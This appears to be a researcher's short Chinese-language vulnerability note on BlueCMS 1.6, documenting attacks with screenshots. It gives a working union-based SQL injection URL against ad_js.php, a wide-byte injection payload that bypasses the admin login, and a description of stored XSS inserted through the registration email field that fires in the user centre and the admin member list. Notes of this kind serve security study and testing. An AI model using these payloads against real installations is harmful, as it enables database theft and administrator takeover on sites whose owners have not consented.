### bluecms

```
版本信息：1.6
```

#### SQL注入

```
ad_js.php?ad_id=1 union select 1,2,3,4,5,6,database()
```

![Snipaste_2022-10-24_14-41-55.jpg](images/Snipaste_2022-10-24_14-41-55.jpg)

#### 后台宽字节注入万能密码登录

```
admin%df' or 1=1
```

![Snipaste_2022-10-24_14-47-12.jpg](images/Snipaste_2022-10-24_14-47-12.jpg)

#### 用户注册处XSS

注册的时候抓包，在邮箱处插入payload

![Snipaste_2022-10-24_15-04-20.jpg](images/Snipaste_2022-10-24_15-04-20.jpg)

在个人中心处即可看到触发了弹窗

![Snipaste_2022-10-24_15-05-12.jpg](images/Snipaste_2022-10-24_15-05-12.jpg)

管理员登录后台查看会员列表，亦可看到触发弹窗

![Snipaste_2022-10-24_15-06-29.jpg](images/Snipaste_2022-10-24_15-06-29.jpg)